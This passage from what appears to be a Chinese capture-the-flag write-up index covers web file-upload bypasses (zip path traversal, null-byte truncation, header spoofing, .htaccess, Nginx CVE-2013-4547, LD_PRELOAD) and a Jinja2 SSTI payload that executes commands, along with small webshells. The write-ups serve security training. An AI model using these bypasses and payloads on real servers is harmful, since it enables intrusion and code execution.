exit('\u4ec5\u5141\u8bb8\u4e0a\u4f20zip\u3001jpg\u3001gif\u3001png\u6587\u4ef6!');\n    }\n}\n</code></pre> <p>\u5728\u4e0a\u4f20\u65f6\uff0c\u4f7f\u7528\u767d\u540d\u5355\u9a8c\u8bc1\u4e0a\u4f20\u6587\u4ef6\u540e\u7f00</p> <pre><code>if(in_array($ext, array('zip', 'jpg', 'gif', 'png'))){\n</code></pre> <p>\u4e0d\u8fc7\u672c\u4e0a\u4f20\u70b9\u652f\u6301\u4e0a\u4f20 zip \u538b\u7f29\u5305\uff0c\u4e14\u4f1a\u5c06 zip \u5305\u89e3\u538b\u5230\u6587\u4ef6\u4e0a\u4f20\u76ee\u5f55\u4e2d\uff0c\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u5b89\u5168\u95ee\u9898</p> <pre><code>if($ext == 'zip'){\n            $archive = new PclZip($file['tmp_name']);\n            foreach($archive-&gt;listContent() as $value){\n                $filename = $value[\"filename\"];\n                if(preg_match('/\\.php$/', $filename)){\n                     exit(\"\u538b\u7f29\u5305\u5185\u4e0d\u5141\u8bb8\u542b\u6709php\u6587\u4ef6!\");\n                 }\n            }\n            if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) {\n                check_dir($dir);\n                   exit(\"\u89e3\u538b\u5931\u8d25\");\n            }\n\n            check_dir($dir);\n            exit('\u4e0a\u4f20\u6210\u529f!');\n        }\n</code></pre> <p>\u9996\u5148\u4f1a\u68c0\u6d4b\u538b\u7f29\u5305\u5185\u662f\u5426\u542b\u6709 <code>.php</code> \u6587\u4ef6\uff0c\u5982\u679c\u5b58\u5728 <code>.php</code> \u6587\u4ef6\u5c31\u76f4\u63a5\u9000\u51fa\u89e3\u538b\u6d41\u7a0b</p> <p>\u5728\u89e3\u538b\u5b8c\u6210\u540e\uff0c\u4f1a\u8c03\u7528 <code>check_dir()</code> \u65b9\u6cd5\u518d\u6b21\u68c0\u6d4b\u89e3\u538b\u51fa\u6765\u7684\u6587\u4ef6\u662f\u5426\u542b\u6709\u6076\u610f\u6587\u4ef6</p> <pre><code>    function check_dir($dir){\n        $handle = opendir($dir);\n        while(($f = readdir($handle)) !== false){\n            if(!in_array($f, array('.', '..'))){\n                if(is_dir($dir.$f)){\n                    check_dir($dir.$f.'/');\n                 }else{\n                    $ext = strtolower(substr(strrchr($f, '.'), 1));\n                    if(!in_array($ext, array('jpg', 'gif', 'png'))){\n                        unlink($dir.$f);\n                    }\n                }\n\n            }\n        }\n    }\n</code></pre> <p>\u5e76\u4e14\u56e0\u4e3a\u89e3\u538b\u5230\u7684\u76ee\u5f55\u662f\u4e00\u4e2a\u968f\u673a\u751f\u6210\u7684\u76ee\u5f55\uff0c\u76ee\u5f55\u540d\u65e0\u6cd5\u9884\u6d4b\uff0c\u4e0e\u5bfc\u81f4\u4e0d\u80fd\u4f7f\u7528\u6761\u4ef6\u7ade\u4e89\u65b9\u6cd5</p> <pre><code>if(!is_dir($dir)){\n        mkdir($dir);\n    }\n\n    $temp_dir = $dir.md5(time(). rand(1000,9999));\n    if(!is_dir($temp_dir)){\n        mkdir($temp_dir);\n    }\n</code></pre> <p>\u9996\u5148\u6765\u7ed5\u7b2c\u4e00\u4e2a\u8fc7\u6ee4\uff0c \u9ed1\u540d\u5355\u8fc7\u6ee4\u4e86 php \u6587\u4ef6\uff0c\u538b\u7f29\u5305\u5185\u4e0d\u80fd\u542b\u6709 <code>.php</code> \u6587\u4ef6\uff0c\u8fd9\u91cc\u6b63\u5219\u4e3a <code>.php$</code> \u9650\u5236\u4e86\u7ed3\u5c3e</p> <p>\u6240\u4ee5\u53ef\u4ee5\u5c1d\u8bd5 <code>php3\u3001php5\u3001phtml</code> \u7b49\u7ed5\u8fc7\uff0c\u4e0d\u8fc7\u670d\u52a1\u7aef\u53ea\u914d\u7f6e\u4e86\u89e3\u6790 php \u6587\u4ef6\uff0c\u5bfc\u81f4\u8be5\u7c7b\u7ed5\u8fc7\u4e0d\u53ef\u7528</p> <p></p> <p>\u6839\u636e 404 \u9875\u9762,\u53d1\u73b0\u4f7f\u7528\u7684\u662f apache\uff0c\u5f88\u5bb9\u6613\u8054\u60f3\u5230 apache \u7684\u591a\u540e\u7f00\u6587\u4ef6\u89e3\u6790\u6f0f\u6d1e</p> <p>\u8fd9\u91cc\u9009\u62e9\u4e0a\u4f20\u4e00\u4e2a <code>x.php.xxx</code> \u6587\u4ef6</p> <p>\u901a\u8fc7 010editor \u6784\u9020\u6076\u610f\u538b\u7f29\u5305\uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4fee\u6539\u540e\u7684\u6587\u4ef6\u540d\u957f\u5ea6\u4e0e\u4fee\u6539\u524d\u4e00\u81f4\uff0c\u5426\u5219\u89e3\u538b\u4f1a\u62a5\u9519</p> <p>\u8fd9\u91cc\u6539\u4e3a <code>/../../jason07.php.xxx</code></p> <p></p> <p>\u4e0a\u4f20\u538b\u7f29\u5305\uff0c\u8bbf\u95ee <code>jason07.php.xxx</code>\uff0c\u5f97\u5230 flag</p> <p></p>"},{"location":"Web/Chapter10/10-15/","title":"00 \u622a\u65ad\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-15/#00-\u622a\u65ad\u7ed5\u8fc7","title":"%00 \u622a\u65ad\u7ed5\u8fc7","text":"<p><code>%00</code> \u662f URL \u7f16\u7801\u4e2d**\u7a7a\u5b57\u8282\uff08null byte\uff0c\\x00\uff09**\u7684\u8868\u793a\u65b9\u5f0f</p> <p>\u7a7a\u5b57\u8282\u5728**C \u8bed\u8a00\u7b49\u5e95\u5c42\u8bed\u8a00**\u4e2d\uff0c\u5e38\u7528\u4f5c\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u6807\u5fd7</p> <p>\u4f8b\u5982\uff0c<code>char filename[100] = \"shell.php\\x00.jpg\";</code>  \u5b9e\u9645\u4e0a\u7b49\u540c\u4e8e  <code>shell.php</code>\uff0c<code>\\x00</code>  \u4e4b\u540e\u7684\u5185\u5bb9\u88ab\u5ffd\u7565</p> <p><code>%00</code> \u7684\u4f7f\u7528\u662f\u5728\u8def\u5f84\u4e0a\uff01</p> <p><code>%00</code> \u7684\u4f7f\u7528\u662f\u5728\u8def\u5f84\u4e0a\uff01</p> <p><code>%00</code> \u7684\u4f7f\u7528\u662f\u5728\u8def\u5f84\u4e0a\uff01</p> <p>\u91cd\u8981\u7684\u8bdd\u8bf4\u4e09\u904d\uff0c\u5982\u679c\u5728\u6587\u4ef6\u540d\u4e0a\u4f7f\u7528\uff0c\u5c31\u65e0\u6cd5\u6b63\u5e38\u622a\u65ad\u4e86</p> <p>\u8fd9\u4e2a\u8def\u5f84\u53ef\u80fd\u5728 POST  \u6570\u636e\u5305\u4e2d\uff0c\u4e5f\u53ef\u80fd\u5728 URL \u4e2d</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter10/10-16/","title":"\u53cc\u5199\u540e\u7f00\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-16/#\u53cc\u5199\u540e\u7f00\u7ed5\u8fc7","title":"\u53cc\u5199\u540e\u7f00\u7ed5\u8fc7","text":"<p>\u51c6\u5907\u4e00\u4e2a <code>*.pphphp</code> \u6587\u4ef6\u4e0a\u4f20</p> <p>\u540e\u7aef\u4f1a\u81ea\u52a8\u66ff\u6362\u5176\u4e2d\u7684 <code>php</code> \u4e3a\u7a7a\u503c\uff0c\u8fd9\u6837\u4e24\u8fb9\u7684 <code>p</code> + <code>hp</code> \u81ea\u52a8\u5408\u5e76\u6210\u4e86 <code>php</code></p> <p></p>"},{"location":"Web/Chapter10/10-17/","title":"PNG \u56fe\u7247\u9a6c\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-17/#png-\u56fe\u7247\u9a6c\u7ed5\u8fc7","title":"PNG \u56fe\u7247\u9a6c\u7ed5\u8fc7","text":"<p>\u4e0a\u4f20\u6728\u9a6c\u56de\u663e\u5fc5\u987b\u5305\u542b <code>.png</code></p> <p></p> <p>\u4fee\u6539\u6587\u4ef6\u540d\u540e\u53d1\u73b0\u56de\u663e\u6587\u4ef6\u5934\u4e0d\u5bf9</p> <p></p> <p>\u76f4\u63a5\u5728\u6587\u4ef6\u5934\u524d\u6dfb\u52a0 PNG</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f</p> <p></p> <p>\u6587\u4ef6\u653e\u5728\u4e86 <code>/uploads</code> \u76ee\u5f55\u4e0b</p> <p></p>"},{"location":"Web/Chapter10/10-18/","title":"\u6587\u4ef6\u540d\u52a0 / \u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-18/#\u6587\u4ef6\u540d\u52a0--\u7ed5\u8fc7","title":"\u6587\u4ef6\u540d\u52a0 / \u7ed5\u8fc7","text":"<p>\u6f0f\u6d1e\u672c\u8d28 Tomcat \u914d\u7f6e\u4e86\u53ef\u5199\uff08readonly=false\uff09\uff0c\u5bfc\u81f4\u6211\u4eec\u53ef\u4ee5\u5f80\u670d\u52a1\u5668\u5199\u6587\u4ef6</p> <pre><code>&lt;servlet&gt;\n    &lt;servlet-name&gt;default&lt;/servlet-name&gt;\n    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;\n    &lt;init-param&gt;\n        &lt;param-name&gt;debug&lt;/param-name&gt;\n        &lt;param-value&gt;0&lt;/param-value&gt;\n    &lt;/init-param&gt;\n    &lt;init-param&gt;\n        &lt;param-name&gt;listings&lt;/param-name&gt;\n        &lt;param-value&gt;false&lt;/param-value&gt;\n    &lt;/init-param&gt;\n    &lt;init-param&gt;\n        &lt;param-name&gt;readonly&lt;/param-name&gt;\n        &lt;param-value&gt;false&lt;/param-value&gt;\n    &lt;/init-param&gt;\n    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;\n&lt;/servlet&gt;\n</code></pre> <p>\u867d\u7136 Tomcat \u5bf9\u6587\u4ef6\u540e\u7f00\u6709\u4e00\u5b9a\u68c0\u6d4b\uff08\u4e0d\u80fd\u76f4\u63a5\u5199 JSP\uff09\uff0c\u4f46\u6211\u4eec\u4f7f\u7528\u4e00\u4e9b\u6587\u4ef6\u7cfb\u7edf\u7684\u7279\u6027\uff08\u5982 Linux\u4e0b\u53ef\u7528 <code>/</code>\uff09\u6765\u7ed5\u8fc7\u4e86\u9650\u5236</p> <p></p> <p></p>"},{"location":"Web/Chapter10/10-2/","title":"Python WebShell","text":""},{"location":"Web/Chapter10/10-2/#python-webshell","title":"Python WebShell","text":"<p>\u6253\u5f00\u7f51\u9875\u662f\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20</p> <p></p> <p>\u8fd9\u662f Python \u7684 Flask \u6846\u67b6\uff0c\u7f16\u5199 Python \u7684\u6728\u9a6c</p> <pre><code>import os\nos.system('cat /flag')\n</code></pre> <p></p> <p>\u4e0a\u4f20\u6587\u4ef6</p> <p></p> <p>\u4ee3\u7801\u88ab\u6267\u884c\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter10/10-20/","title":"Nginx \u6587\u4ef6\u540d\u7ed5\u8fc7\uff08CVE-2013-4547\uff09","text":""},{"location":"Web/Chapter10/10-20/#nginx-\u6587\u4ef6\u4e0a\u4f20\u7ed5\u8fc7cve-2013-4547","title":"Nginx \u6587\u4ef6\u4e0a\u4f20\u7ed5\u8fc7\uff08CVE-2013-4547\uff09","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u539f\u7406\u662f\uff0cNginx \u9519\u8bef\u5730\u89e3\u6790\u4e86\u8bf7\u6c42\u7684 URI\uff0c\u9519\u8bef\u5730\u83b7\u53d6\u5230\u7528\u6237\u8bf7\u6c42\u7684\u6587\u4ef6\u540d\uff0c\u5bfc\u81f4\u51fa\u73b0\u6743\u9650\u7ed5\u8fc7\u3001\u4ee3\u7801\u6267\u884c\u7b49\u8fde\u5e26\u5f71\u54cd</p> <pre><code>location ~ \\.php$ {\n    include        fastcgi_params;\n\n    fastcgi_pass   127.0.0.1:9000;\n    fastcgi_index  index.php;\n    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;\n    fastcgi_param  DOCUMENT_ROOT /var/www/html;\n}\n</code></pre> <p>\u6b63\u5e38\u60c5\u51b5\u4e0b\uff08\u5173\u95ed pathinfo \u7684\u60c5\u51b5\u4e0b\uff09\uff0c\u53ea\u6709 .php \u540e\u7f00\u7684\u6587\u4ef6\u624d\u4f1a\u88ab\u53d1\u9001\u7ed9 Fastcgi \u89e3\u6790</p> <p>\u800c\u5b58\u5728 CVE-2013-4547 \u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u8bf7\u6c42 <code>1.gif[0x20][0x00].php</code>\uff0c\u8fd9\u4e2a URI \u53ef\u4ee5\u5339\u914d\u4e0a\u6b63\u5219 <code>\\.php$</code>\uff0c\u53ef\u4ee5\u8fdb\u5165\u8fd9\u4e2a Location \u5757\uff1b\u4f46\u8fdb\u5165\u540e\uff0cNginx \u5374\u9519\u8bef\u5730\u8ba4\u4e3a\u8bf7\u6c42\u7684\u6587\u4ef6\u662f <code>1.gif[0x20]</code>\uff0c\u5c31\u8bbe\u7f6e\u5176\u4e3a <code>SCRIPT_FILENAME</code> \u7684\u503c\u53d1\u9001\u7ed9Fastcgi</p> <p>Fastcgi \u6839\u636e <code>SCRIPT_FILENAME</code>\u7684\u503c\u8fdb\u884c\u89e3\u6790\uff0c\u6700\u540e\u9020\u6210\u4e86\u89e3\u6790\u6f0f\u6d1e</p> <p>\u4e0a\u4f20\u53cd\u5f39 Shell\uff0c\u5148\u6dfb\u52a0\u4e24\u4e2a\u7a7a\u683c</p> <p></p> <p>\u5c06\u4e24\u4e2a <code>20</code> \u7684\u6700\u540e\u4e00\u4e2a\u6539\u4e3a <code>00</code></p> <p></p> <p>\u4e0a\u4f20\u6210\u529f</p> <p></p> <p>\u8bbf\u95ee\u4e0a\u4f20\u7684\u6587\u4ef6</p> <p></p> <p>\u6210\u529f\u8fde\u63a5</p> <p></p>"},{"location":"Web/Chapter10/10-3/","title":"JavaScript \u52a0\u5bc6\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-3/#javascript-\u52a0\u5bc6\u7ed5\u8fc7","title":"JavaScript \u52a0\u5bc6\u7ed5\u8fc7","text":"<p>\u5b9e\u6218\u6253\u7f51\u7ad9</p> <p></p> <p>\u5148\u53bb\u6ce8\u518c\u8d26\u53f7</p> <p></p> <p>\u7136\u540e\u767b\u5f55</p> <p></p> <p>\u770b\u5230\u5934\u50cf\u662f\u4e00\u4e2a\u4e0a\u4f20\u70b9</p> <p></p> <p>\u4e0a\u4f20\u56fe\u7247\u8bd5\u8bd5</p> <p></p> <p>\u5934\u50cf\u53d8\u4e86\u786e\u8ba4\u53ef\u4ee5\u4e0a\u4f20</p> <p></p> <p>\u518d\u6b21\u4e0a\u4f20\u6253\u5f00 BurpSuite \u6293\u5305\u62e6\u622a</p> <p></p> <p>\u524d\u7aef\u8fdb\u884c\u4e86 Base64 \u7f16\u7801\uff0c\u540c\u65f6\u8bbe\u7f6e\u4e86\u6587\u4ef6\u7c7b\u578b</p> <p></p> <p>\u4fee\u6539\u7c7b\u578b\u4e3a PHP\uff0c\u4e0a\u4f20 Base64 \u7f16\u7801\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <p></p> <p>\u6253\u5f00\u4e2d\u56fd\u8681\u5251\u6d4b\u8bd5\u8fde\u63a5</p> <p></p> <p>\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter10/10-4/","title":"Content-type \u56fe\u7247\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-4/#content-type-\u56fe\u7247\u7ed5\u8fc7","title":"Content-type \u56fe\u7247\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u6b63\u5e38\u7684\u6587\u4ef6\u4e0a\u4f20</p> <p></p> <p><code>strpos()</code> \u51fd\u6570\u67e5\u627e\u5b57\u7b26\u4e32\u5728\u53e6\u4e00\u5b57\u7b26\u4e32\u4e2d\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</p> <p>\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u5927\u5c0f\u5199\u6df7\u6dc6\u7ed5\u8fc7</p> <p></p> <p>\u5e38\u89c4\u7684 php \u540e\u7f00\u88ab\u66ff\u6362\uff0c\u6362\u6210 php4 \u53ef\u4ee5</p> <p>\u6700\u540e\u662f\u4fee\u6539 Content-Type \u7c7b\u578b\u4e3a\u56fe\u7247\u5373\u53ef</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f</p> <p></p> <p>\u4f7f\u7528\u8681\u5251\u8fde\u63a5\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter10/10-5/","title":"disable_functions \u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-5/#disable_functions-\u7ed5\u8fc7","title":"disable_functions \u7ed5\u8fc7","text":"<p>\u52a0\u5bc6\u6df7\u6dc6\uff0c\u8fd9\u4e00\u6b65\u56e0\u4e3a\u89e3\u5bc6\u7f51\u7ad9\u6302\u4e86\u5c31\u8df3\u8fc7</p> <p></p> <p>\u7f51\u4e0a\u627e\u7684\u56fe</p> <p></p> <p>\u4f7f\u7528\u4e2d\u56fd\u8681\u5251\u8fdc\u7a0b\u8fde\u63a5</p> <p></p> <p>\u8bbf\u95ee\u522b\u7684\u76ee\u5f55\u62a5\u9519\uff0c\u5e94\u8be5\u8bbe\u7f6e\u4e86 <code>disable_function()</code> \u51fd\u6570</p> <p></p> <p>\u57fa\u4e8e\u9ed1\u540d\u5355\u6765\u5b9e\u73b0\u5bf9\u67d0\u4e9b\u51fd\u6570\u4f7f\u7528\u7684\u9650\u5236</p> <p></p> <p>\u4f7f\u7528\u8681\u5251\u7684\u63d2\u4ef6\u7ed5\u8fc7\uff0c\u7f51\u4e0d\u884c\u7684\u81ea\u5df1\u53bb GitHub \u4e0a\u4e0b\u63d2\u4ef6</p> <p></p> <p>LD_PRELOAD \u662f\u4e00\u4e2a\u53ef\u9009\u7684 Unix \u73af\u5883\u53d8\u91cf\uff0c  \u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u5171\u4eab\u5e93\u6216\u5171\u4eab\u5e93\u7684\u8def\u5f84</p> <p>\u5b83\u5141\u8bb8\u4f60\u5b9a\u4e49\u5728\u7a0b\u5e8f\u8fd0\u884c\u524d\u4f18\u5148\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5373\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u751f\u6210\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\u52a0\u8f7d</p> <p>\u4ee5\u8986\u76d6\u6b63\u5e38\u7684\u51fd\u6570\u5e93\uff0c\u4e5f\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u7a0b\u5e8f\uff0c\u6267\u884c\u6076\u610f\u547d\u4ee4</p> <p>\u6700\u540e\u8fdc\u7a0b\u8fde\u63a5\u8fd9\u4e2a\u65b0\u6728\u9a6c\u5c31\u884c\u4e86\uff0c\u5bc6\u7801\u4e00\u6837\u7684</p> <p></p>"},{"location":"Web/Chapter10/10-6/","title":"phtml \u540e\u7f00\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-6/#phtml-\u540e\u7f00\u7ed5\u8fc7","title":"phtml \u540e\u7f00\u7ed5\u8fc7","text":"<p>\u8003\u5bdf\u7684\u662f\u6587\u4ef6\u4e0a\u4f20</p> <p></p> <p>\u4e0a\u4f20\u6b63\u5e38\u7684 PHP \u6539 MIME \u90fd\u4e0d\u884c</p> <p></p> <p>\u5c1d\u8bd5\u4fee\u6539\u540e\u7f00\u4e3a php3\u3001Php\u3001phtml \u7b49\uff0c\u53d1\u73b0 phtml \u53ef\u4ee5</p> <p></p>"},{"location":"Web/Chapter10/10-7/","title":"GIF \u6587\u4ef6\u5934\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-7/#gif-\u6587\u4ef6\u5934\u7ed5\u8fc7","title":"GIF \u6587\u4ef6\u5934\u7ed5\u8fc7","text":"<p>\u7ee7\u4e0a\u4e00\u8282\u53d1\u73b0\u5b83\u8fc7\u6ee4 &lt; \u53ca ? \u4e4b\u540e</p> <p>\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e00\u8282\u7684 JavaScript WebShell \u7ed5\u8fc7</p> <p>\u4f46\u8fd8\u662f\u88ab\u62e6\u622a\u4e86\uff0c\u8981\u6c42\u662f\u56fe\u7247\u7c7b\u578b</p> <p></p> <p>\u6dfb\u52a0\u4e00\u4e2a GIF \u7684\u6587\u4ef6\u5934\u7ed5\u8fc7</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f</p> <p></p> <p>\u626b\u63cf\u540e\u53f0\u6709\u4e2a upload \u76ee\u5f55\u53ef\u4ee5\u8bbf\u95ee</p> <p></p> <p>\u6253\u5f00\u8681\u5251\u8fde\u63a5\u6211\u4eec\u4e0a\u4f20\u7684\u6587\u4ef6</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter10/10-8/","title":"JavaScript \u9a8c\u8bc1\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-8/#javascript-\u9a8c\u8bc1\u7ed5\u8fc7","title":"JavaScript \u9a8c\u8bc1\u7ed5\u8fc7","text":"<p>\u4e0e\u4e0a\u4e00\u8282\u65b9\u6cd5\u4e00\u6837\uff0c\u53ea\u4e0d\u8fc7\u591a\u4e86\u4e00\u4e2a\u524d\u7aef JS \u9a8c\u8bc1</p> <p>\u6d4f\u89c8\u5668\u8bbe\u7f6e\u7981\u7528 JS \u5c31\u53ef\u4ee5\u7ed5\u8fc7</p> <p></p> <p>\u4e0a\u4f20\u6587\u4ef6\u6210\u529f</p> <p></p> <p>\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter10/10-9/","title":".htaccess \u89e3\u6790\u7ed5\u8fc7","text":""},{"location":"Web/Chapter10/10-9/#htaccess-\u89e3\u6790\u7ed5\u8fc7","title":".htaccess \u89e3\u6790\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u8003\u5bdf\u6587\u4ef6\u4e0a\u4f20</p> <p></p> <p>\u5229\u7528 Apache \u7684 .htaccess \u89e3\u6790\u6f0f\u6d1e\uff0c\u5c06\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u6309 PHP \u89e3\u6790</p> <p></p> <p>\u4e0a\u4f20\u65f6\u4fee\u6539 MIME \u7c7b\u578b\u4e3a\u56fe\u7247\u7c7b</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f</p> <p></p> <p>\u63a5\u7740\u4e0a\u4f20\u6728\u9a6c\u6587\u4ef6\uff08\u8981\u4e0e .htaccess \u4e2d\u7684\u4fdd\u6301\u4e00\u81f4\uff09</p> <p></p> <p>\u6253\u5f00\u4e2d\u56fd\u8681\u5251\u5efa\u7acb\u8fdc\u7a0b\u8fde\u63a5</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter11/11-1/","title":"SSTI \u6dfb\u52a0\u8def\u7531","text":""},{"location":"Web/Chapter11/11-1/#ssti-\u6dfb\u52a0\u8def\u7531","title":"SSTI \u6dfb\u52a0\u8def\u7531","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u4ee3\u7801</p> <p></p> <p>\u9996\u5148\u80af\u5b9a\u662f\u683c\u5f0f\u5316\u4e00\u4e0b</p> <pre><code>import os\nimport jinja2\nimport functools\nimport uvicorn\nfrom fastapi import FastAPI\nfrom fastapi.templating import Jinja2Templates\nfrom anyio import fail_after\n\n# jinja2==3.1.2\n# uvicorn==0.30.5\n# fastapi==0.112.0\n\n# \u8fd9\u662f\u4e00\u4e2a\u88c5\u9970\u5668\uff0c\u7528\u4e8e\u7ed9\u88ab\u88c5\u9970\u7684\u51fd\u6570\u6dfb\u52a0\u8d85\u65f6\u529f\u80fd\n# \u5b83\u4f7f\u7528 anyio.fail_after \u6765\u5728\u51fd\u6570\u6267\u884c\u8d85\u8fc7\u6307\u5b9a\u8d85\u65f6\u65f6\u95f4\uff08\u9ed8\u8ba4 1 \u79d2\uff09\u65f6\u629b\u51fa\u5f02\u5e38\ndef timeout_after(timeout: int = 1):\n    def decorator(func):\n        @functools.wraps(func)\n        async def wrapper(*args, **kwargs):\n            with fail_after(timeout):\n                return await func(*args, **kwargs)\n        return wrapper\n    return decorator\n\n# \u521b\u5efa\u4e86 FastAPI \u5e94\u7528\u5b9e\u4f8b\napp = FastAPI()\naccess = False\n\n# \u4fdd\u5b58\u5f53\u524d\u6587\u4ef6\u7684\u76ee\u5f55\uff0c\u7528\u4e8e\u540e\u7eed\u52a0\u8f7d Jinja2 \u6a21\u677f\n_base_path = os.path.dirname(os.path.abspath(__file__))\n\n# t \u521d\u59cb\u5316\u4e86 Jinja2Templates\uff0c\u7528\u4e8e\u4ece\u6307\u5b9a\u76ee\u5f55\u52a0\u8f7d Jinja2 \u6a21\u677f\nt = Jinja2Templates(directory=_base_path)\n\n# \u8be5\u8def\u7531\u4f1a\u8fd4\u56de\u5f53\u524d Python \u6587\u4ef6\u7684\u5185\u5bb9\uff08\u4ee5\u6587\u672c\u5f62\u5f0f\uff09\u5f53\u901a\u8fc7 GET \u8bf7\u6c42\u8bbf\u95ee / \u65f6\n@app.get(\"/\")\n@timeout_after(1)\nasync def index():\n    return open(__file__, 'r').read()\n\n# \u8def\u7531\u901a\u8fc7 GET \u8bf7\u6c42\u8bbf\u95ee /calc\uff0c\u5e76\u671f\u671b\u4e00\u4e2a\u67e5\u8be2\u53c2\u6570 calc_req\n@app.get(\"/calc\")\n@timeout_after(1)\nasync def ssti(calc_req: str):\n    global access\n    if (any(char.isdigit() for char in calc_req)) or (\"%\" in calc_req) or not calc_req.isascii() or access:\n        return \"bad char\"\n    else:\n        result = jinja2.Environment(loader=jinja2.BaseLoader()).from_string(f\"{{{{ {calc_req} }}}}\").render(\n            {\"app\": app})\n        access = True\n        return result  # \u8fd4\u56de\u8ba1\u7b97\u7ed3\u679c\n    return \"fight\"\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"127.0.0.1\", port=8000)\n</code></pre> <p>\u7b2c\u4e00\u4e2a \"/\" \u8def\u7531\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684</p> <p>/calc \u9996\u5148\u662f\u68c0\u67e5 calc_req \u662f\u5426\u5305\u542b\u6570\u5b57\u3001\u767e\u5206\u53f7\u3001\u975e ASCII \u5b57\u7b26\uff0c\u6216\u8005 access \u662f\u5426\u5df2\u7ecf\u88ab\u8bbe\u7f6e\u4e3a True</p> <p>\u5982\u679c\u5b89\u5168\u68c0\u67e5\u901a\u8fc7\uff0c\u8fd9\u884c\u4ee3\u7801\u5c06\u4f7f\u7528 Jinja2 \u6a21\u677f\u5f15\u64ce\u6e32\u67d3 calc_req \u53c2\u6570</p> <pre><code>jinja2.Environment(loader=jinja2.BaseLoader())\uff1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684Jinja2\u73af\u5883\n\nfrom_string()\uff1a\u5c06 calc_req \u4f5c\u4e3a\u6a21\u677f\u5b57\u7b26\u4e32\u8fdb\u884c\u6e32\u67d3\n\n\u56db\u4e2a { } \u7528\u4e8e\u8f6c\u4e49\u5927\u62ec\u53f7\u4f7f\u5176\u4e0d\u88ab\u89e3\u91ca\u4e3a\u6a21\u677f\u53d8\u91cf\n</code></pre> <p>\u6784\u9020 Payload \u9996\u5148\u662f GET \u8bf7\u6c42\uff1a</p> <pre><code>/calc?calc_req=config.__init__.__globals__['__builtins__']['exec']()\n\n# config \u5bf9\u8c61\u5305\u542b\u4e86\u6a21\u677f\u73af\u5883\u7684\u914d\u7f6e\n# __init__ \u662f\u4e00\u4e2a\u5305\u542b\u6a21\u677f\u73af\u5883\u5168\u5c40\u53d8\u91cf\u7684\u5c5e\u6027\n# __globals__ \u5b57\u5178\u5305\u542b\u4e86\u5168\u5c40\u53d8\u91cf\n# \u653b\u51fb\u8005\u901a\u8fc7\u8bbf\u95ee __builtins__ \u5b57\u5178\u4e2d\u7684 exec \u51fd\u6570\u7528\u4e8e\u6267\u884c\u5b57\u7b26\u4e32\u5f62\u5f0f\u7684 Python \u4ee3\u7801\n</code></pre> <pre><code>'app.add_api_route(\"/flag\",lambda:__import__(\"os\").popen(\"cat /flag\").read());'\n\n# app.add_api_route(\"/flag\", lambda: ...) \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u8def\u7531 /flag\n# \u4e5f\u53ef\u4ee5\u4f7f\u7528 ['__builtins__'].eval()\n# \u4e5f\u53ef\u4ee5 modules['__main__'],'__file__','/flag' \u76f4\u63a5\u4fee\u6539\u6a21\u677f\u76ee\u5f55\n</code></pre> <p>\u8bbf\u95ee /flag \u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter11/11-10/","title":"config \u5bf9\u8c61\u6a21\u677f\u6ce8\u5165\u653b\u51fb","text":""},{"location":"Web/Chapter11/11-10/#config-\u5bf9\u8c61\u6a21\u677f\u6ce8\u5165\u653b\u51fb","title":"config \u5bf9\u8c61\u6a21\u677f\u6ce8\u5165\u653b\u51fb","text":"<p>\u6253\u5f00\u7f51\u9875\u63d0\u793a\u8ba9\u6211\u4eec\u5df2\u6ce8\u91ca\u65b9\u5f0f\u63d0\u4ea4 search</p> 